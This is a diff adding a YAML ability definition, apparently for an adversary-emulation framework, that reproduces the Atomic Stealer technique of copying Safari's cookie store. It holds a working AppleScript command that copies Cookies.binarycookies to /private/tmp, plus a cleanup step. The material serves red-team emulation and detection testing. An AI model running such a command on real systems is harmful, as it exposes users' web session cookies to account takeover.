@@ -1,0 +1,21 @@
+---
+- id: 3277982271b2dc197d1c9bbcd88847ca
+  name: Copy Safari BinaryCookies files using AppleScript
+  description: 'This command will copy Safari BinaryCookies files using AppleScript
+    as seen in Atomic Stealer.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1539
+    name: Steal Web Session Cookie
+  platforms:
+    darwin:
+      sh:
+        command: osascript -e 'tell application "Finder"' -e 'set destinationFolderPath
+          to POSIX file "/private/tmp"' -e 'set safariFolder to ((path to library
+          folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")'
+          -e 'duplicate file "Cookies.binarycookies" of folder safariFolder to folder
+          destinationFolderPath with replacing' -e 'end tell'
+        payloads: []
+        cleanup: rm "/private/tmp/Cookies.binarycookies"
